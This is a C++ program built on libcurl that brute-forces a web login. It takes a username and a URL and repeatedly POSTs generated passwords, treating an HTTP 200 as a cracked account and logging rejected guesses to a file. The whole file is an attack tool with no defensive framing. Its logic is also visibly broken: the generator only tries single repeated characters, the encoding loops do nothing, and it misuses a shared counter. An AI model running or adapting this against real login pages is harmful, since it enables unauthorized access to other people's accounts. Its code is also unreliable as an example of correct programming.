#include <iostream>
#include <fstream>
#include <string>
#include <vector>
#include <thread>
#include <future>
#include <chrono>
#include <mutex>
#include <random>
#include <algorithm>
#include <iterator>
#include <set>
#define CURL_STATICLIB
#include <curl/curl.h>
#include <stdexcept>
// Global variables
bool found = false;
std::string found_pass = "";
std::string target = "";
std::string url = "";
int i = 0;
std::mutex mtx;
std::vector<std::string> passwords;

void write_line(const std::string& file_path, const std::string& line) {
    std::vector<std::string> encodings = { "utf-8", "latin-1", "iso-8859-1", "cp1252" };

    for (const auto& encoding : encodings) {
        try {
            std::ofstream file(file_path, std::ios_base::app);
            if (file.is_open()) {
                file << line << std::endl;
                break;
            }
        }
        catch (const std::exception& e) {
            std::cerr << "An error occurred: " << e.what() << std::endl;
            break;
        }
    }
}

std::vector<std::string> read_file(const std::string& file_path) {
    std::vector<std::string> lines;
    std::vector<std::string> encodings = { "utf-8", "latin-1", "iso-8859-1", "cp1252" };

    for (const auto& encoding : encodings) {
        try {
            std::ifstream file(file_path);
            if (file.is_open()) {
                std::string line;
                while (std::getline(file, line)) {
                    lines.push_back(line);
                }
                file.close();
                return lines;
            }
        }
        catch (const std::exception& e) {
            std::cerr << "An error occurred: " << e.what() << std::endl;
            return {};
        }
    }
    return {};
}

std::string generate_password() {
    std::vector<std::string> bad_passwords = read_file("bad_passwords.txt");
    std::string characters = "abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789!@#$%^&*()-_=+[]{}|;:',.<>?/";

    for (int password_length = 1; password_length <= 21; ++password_length) {
        for (char ch : characters) {
            std::string password_attempt(password_length, ch);

            if (std::find(bad_passwords.begin(), bad_passwords.end(), password_attempt) == bad_passwords.end() &&
                std::find(passwords.begin(), passwords.end(), password_attempt) == passwords.end()) {
                return password_attempt;
            }
        }
    }
    return "";
}

size_t discard_data_callback(void* ptr, size_t size, size_t nmemb, void* userdata) {
    return size * nmemb;
}

void advanced_cracking() {
    CURL* curl;
    CURLcode res;
    try {
        curl = curl_easy_init();
        if (curl) {
            std::string user = target;
            std::string password = generate_password();
            passwords.push_back(password);
            std::string data = "user=" + user + "&pass=" + password;

            curl_easy_setopt(curl, CURLOPT_URL, url.c_str());
            curl_easy_setopt(curl, CURLOPT_POSTFIELDS, data.c_str());

            curl_easy_setopt(curl, CURLOPT_WRITEFUNCTION, discard_data_callback);

            res = curl_easy_perform(curl);

            if (res != CURLE_OK) {
                throw std::runtime_error(curl_easy_strerror(res));
            }

            long http_code = 0;
            curl_easy_getinfo(curl, CURLINFO_RESPONSE_CODE, &http_code);

            if (http_code == 200) {
                found_pass = password;
                found = true;
            }
            else if (http_code == 401) {
                write_line("bad_passwords.txt", password);
                passwords.erase(std::remove(passwords.begin(), passwords.end(), password), passwords.end());
            }
            else if (http_code == 400) {
                passwords.erase(std::remove(passwords.begin(), passwords.end(), password), passwords.end());

            }
            else {
                passwords.erase(std::remove(passwords.begin(), passwords.end(), password), passwords.end());
            }

            i += 1;
            curl_easy_cleanup(curl);
        }
        else {
            throw std::runtime_error("Failed to initialize CURL");
        }
    }
    catch (const std::exception& e) {
        // std::cerr << e.what() << std::endl;
    }
}

void status_report() {
    auto start_time = std::chrono::high_resolution_clock::now();
    while (!found) {
        std::this_thread::sleep_for(std::chrono::seconds(1)); 

        std::lock_guard<std::mutex> lock(mtx);
        if (i % 1000 == 0 && i != 0) {
            auto elapsed_time = std::chrono::high_resolution_clock::now() - start_time;
            double elapsed_seconds = std::chrono::duration_cast<std::chrono::seconds>(elapsed_time).count();
            std::vector<std::string> bad_passwords = read_file("bad_passwords.txt");
            std::cout << "Tried " << i << " attempts \nTotal " << bad_passwords.size() << " combinations.\n";
            std::cout << "Time taken for last 1000 iterations: " << elapsed_seconds << " seconds" << std::endl;
            start_time = std::chrono::high_resolution_clock::now(); // Reset the start time
        }
    }

}


int main(int argc, char* argv[]) {
    std::thread status_thread(status_report);
    status_thread.detach();
    if (argv[1]) {
        target = argv[1];
    } else {
        std::cout << "you must input a target";
        return 0;
    }
    if (argv[2]) {
        url = argv[2];
    } else {
        std::cout << "you must input a url";
        return 0;
    }
    std::cout << "Initiating bruteforce against " << target << " on " << url << "\n";
    while (!found) {
        for (int i = 0; i < 100000; ++i) {
            std::thread y(advanced_cracking);
            y.join();


        }
    }
    std::cout << found_pass;
    std::cout << found << std::endl;

    return 0;
}
